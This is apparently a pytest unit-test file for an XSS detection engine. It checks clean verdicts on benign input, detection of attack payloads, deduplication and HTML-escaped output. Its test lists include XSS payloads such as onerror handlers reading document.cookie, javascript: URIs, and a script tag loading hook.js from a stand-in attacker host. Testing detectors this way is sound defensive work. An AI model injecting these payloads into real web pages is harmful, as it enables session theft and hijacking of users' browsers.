"""Unit tests for the consolidated XSSDetectionEngine."""

import pytest

from xsslab.config.settings import Settings
from xsslab.detector.engine import XSSDetectionEngine
from xsslab.models.finding import ContextType


@pytest.fixture
def engine() -> XSSDetectionEngine:
    """Fixture providing initialized XSSDetectionEngine."""
    return XSSDetectionEngine()


def test_engine_initialization() -> None:
    """Verify engine instantiates correctly with default and custom settings."""
    engine_default = XSSDetectionEngine()
    assert engine_default.settings is not None
    assert engine_default.context_analyzer is not None
    assert engine_default.signature_engine is not None
    assert engine_default.heuristic_analyzer is not None

    custom = Settings(strict_script_blocking=False)
    engine_custom = XSSDetectionEngine(settings=custom)
    assert engine_custom.settings.strict_script_blocking is False


def test_engine_empty_input(engine: XSSDetectionEngine) -> None:
    """Verify empty and whitespace inputs return clean verdicts."""
    res_empty = engine.analyze("")
    assert res_empty.is_malicious is False
    assert res_empty.risk_score == 0.0
    assert res_empty.risk_level == "CLEAN"
    assert res_empty.findings == []

    res_ws = engine.analyze("   \t\n  ")
    assert res_ws.is_malicious is False
    assert res_ws.risk_score == 0.0


def test_engine_benign_inputs(engine: XSSDetectionEngine) -> None:
    """Verify benign text and safe HTML tags are evaluated as CLEAN."""
    benign_samples = [
        "Welcome to the portal user dashboard.",
        "<p>This is a safe announcement with <b>bold</b> and <i>italic</i> formatting.</p>",
        "https://example.com/products?category=electronics&page=2",
        "john.doe@company.org",
        "42",
    ]
    for sample in benign_samples:
        result = engine.analyze(sample)
        assert result.is_malicious is False, f"False positive on: {sample}"
        assert result.risk_score < 30.0, f"Score too high ({result.risk_score}) for: {sample}"
        assert result.risk_level == "CLEAN"


def test_engine_classic_xss_vectors(engine: XSSDetectionEngine) -> None:
    """Verify classic and modern XSS attack vectors are flagged as MALICIOUS."""
    attacks = [
        "<script>alert(1)</script>",
        '<img src=x onerror="alert(document.cookie)">',
        "<a href='javascript:alert(1)'>Click me</a>",
        '"><svg onload=alert(1)>',
        '"><iframe src="javascript:alert(1)"></iframe>',
        "<object data='javascript:alert(1)'></object>",
        "<base href='http://evil.com/'>",
    ]
    for attack in attacks:
        result = engine.analyze(attack)
        assert result.is_malicious is True, f"Failed detection on: {attack}"
        assert result.risk_score >= 70.0
        assert result.risk_level == "MALICIOUS"
        assert len(result.findings) > 0


def test_engine_encoded_and_breakout_vectors(engine: XSSDetectionEngine) -> None:
    """Verify encoded payloads and script delimiter breakouts are flagged."""
    payloads = [
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        '"><script src=http://attacker.com/hook.js></script>',
        "'; alert(1); </script>",
    ]
    for payload in payloads:
        result = engine.analyze(payload)
        assert result.is_malicious is True, f"Failed detection on: {payload}"
        assert result.risk_score >= 70.0


def test_engine_deduplication_and_sanitized_output(engine: XSSDetectionEngine) -> None:
    """Verify deduplication works and sanitized output is generated."""
    payload = "<script>alert(1)</script>"
    result = engine.analyze(payload)
    finding_ids = [f.finding_id for f in result.findings]
    assert len(finding_ids) == len(set(finding_ids))
    assert result.sanitized_output == "&lt;script&gt;alert(1)&lt;/script&gt;"
    assert ContextType.HTML_BODY in result.detected_contexts
